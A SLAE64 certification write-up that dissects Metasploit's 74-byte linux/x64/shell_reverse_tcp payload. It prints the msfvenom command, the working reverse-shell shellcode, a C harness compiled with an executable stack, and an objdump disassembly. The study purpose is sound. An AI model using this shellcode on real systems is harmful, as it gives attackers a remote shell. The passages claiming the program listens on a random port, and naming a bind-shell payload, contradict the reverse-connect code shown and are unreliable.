## Assignment #5.3: Shellcode `linux/x64/shell_reverse_tcp` Dissection
---
---
### Introduction
---
The `msfvenom` shellcode that is going to be dissected in functionality is the `linux/x64/shell_reverse_tcp` payload.

Let's see it's options:
```bash
SLAE64>  msfvenom -p linux/x64/shell_reverse_tcp --list-options
Options for payload/linux/x64/shell_reverse_tcp:
=========================

       Name: Linux Command Shell, Reverse TCP Inline
     Module: payload/linux/x64/shell_reverse_tcp
   Platform: Linux
       Arch: x64
Needs Admin: No
 Total size: 74
       Rank: Normal

Provided by:
    ricky

Basic options:
Name   Current Setting  Required  Description
----   ---------------  --------  -----------
LHOST                   yes       The listen address (an interface may be specified)
LPORT  4444             yes       The listen port

Description:
  Connect back to attacker and spawn a command shell
```

The payload is only 74 bytes and it requires the following parameters:
- `LPORT`: The port to listen for the incoming connection
- `LHOST`: The target to connect back

> NOTE: In the captures of `gdb`, comments are especified with the `<==` symbol. This is added when want to comment what's going on in the debugger. The symbol `==` means that the comment is a continuation from previous line comment.

### Creating the Shellcode
---
Let's generate the shellcode. Let's leave the default port "4444" and let's set LHOST to "127.0.0.1" (loopback address). Let's generate the payload shellcode:
```c
SLAE64> msfvenom -p linux/x64/shell_reverse_tcp LHOST=127.0.0.1 -f c
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of c file: 335 bytes
unsigned char buf[] = 
"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x48"
"\xb9\x02\x00\x11\x5c\x7f\x00\x00\x01\x51\x48\x89\xe6\x6a\x10"
"\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58"
"\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05";
SLAE64> 
```
The generated payload size, this time did not change in size.

### Run Shellcode. The C Template
---
To run the shellcode, will use of the `shellcode.c` template renamed to `Payload_03.c`. The shellcode is placed in the `code[]` string:
```c
#include <stdio.h>
#include <string.h>

unsigned char code[]= \
"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x48"
"\xb9\x02\x00\x11\x5c\x7f\x00\x00\x01\x51\x48\x89\xe6\x6a\x10"
"\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58"
"\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05";

void main()
{
        printf("ShellCode Lenght: %d\n", strlen(code));
        int (*ret)() = (int(*)())code;
        ret();
}
```
Now it can be compiled:
```bash
gcc -fno-stack-protector -z execstack Payload_03.c -o Payload_03
```
When it's run, is listens for incoming connections in a random port. From another terminal using `netstat` check what's the listening port, and with `netcat`, can connect. A shell is spawned:

<img src="https://galminyana.github.io/img/A053_Shellcode_Run.png" width="75%" height="75%">

### `objdump`: First Approach
---
Once we get the executable, will use `objdump` to disassemble the ASM code. As `objdump` disassembles the code by sections, the one of interest is the `<code>` section. Is the one containing the payload shellcode:

```asm
SLAE64> objdump -M intel -D Payload_03
**_REMOVED_**
0000000000004060 <code>:
    4060:       6a 29                   push   0x29
    4062:       58                      pop    rax
    4063:       99                      cdq
    4064:       6a 02                   push   0x2
    4066:       5f                      pop    rdi
    4067:       6a 01                   push   0x1
    4069:       5e                      pop    rsi
    406a:       0f 05                   syscall
    406c:       48 97                   xchg   rdi,rax
    406e:       48 b9 02 00 11 5c 7f    movabs rcx,0x100007f5c110002
    4075:       00 00 01 
    4078:       51                      push   rcx
    4079:       48 89 e6                mov    rsi,rsp
    407c:       6a 10                   push   0x10
    407e:       5a                      pop    rdx
    407f:       6a 2a                   push   0x2a
    4081:       58                      pop    rax
    4082:       0f 05                   syscall
    4084:       6a 03                   push   0x3
    4086:       5e                      pop    rsi
    4087:       48 ff ce                dec    rsi
    408a:       6a 21                   push   0x21
    408c:       58                      pop    rax
    408d:       0f 05                   syscall 
    408f:       75 f6                   jne    4087 <code+0x27>
    4091:       6a 3b                   push   0x3b
    4093:       58                      pop    rax
    4094:       99                      cdq    
    4095:       48 bb 2f 62 69 6e 2f    movabs rbx,0x68732f6e69622f
    409c:       73 68 00 
    409f:       53                      push   rbx
    40a0:       48 89 e7                mov    rdi,rsp
    40a3:       52                      push   rdx
    40a4:       57                      push   rdi
    40a5:       48 89 e6                mov    rsi,rsp
    40a8:       0f 05                   syscall
        ...
**_REMOVED_**
SLAE64> 
```

















### GitHub Repo Files
---
The [GitHub Repo](https://github.com/galminyana/SLAE64/tree/main/Assignment05) for this assignment contains the following files:

- [Payload_03.c](https://github.com/galminyana/SLAE64/blob/main/Assignment05/Payload_03.c) : The C file cloned from `shellcode.c` to execute the `linux/x64/shell_bind_tcp_random_port` shellcode.
- [Shellcode_03.txt](https://github.com/galminyana/SLAE64/blob/main/Assignment05/Shellcode_03.txt) : The rax shellcode in hex into a text file.

### The End
---
This pages have been created for completing the requirements of the [SecurityTube Linux Assembly Expert certification](http://www.securitytube-training.com/online-courses/x8664-assembly-and-shellcoding-on-linux/index.html).

Student ID: PA-14628
 
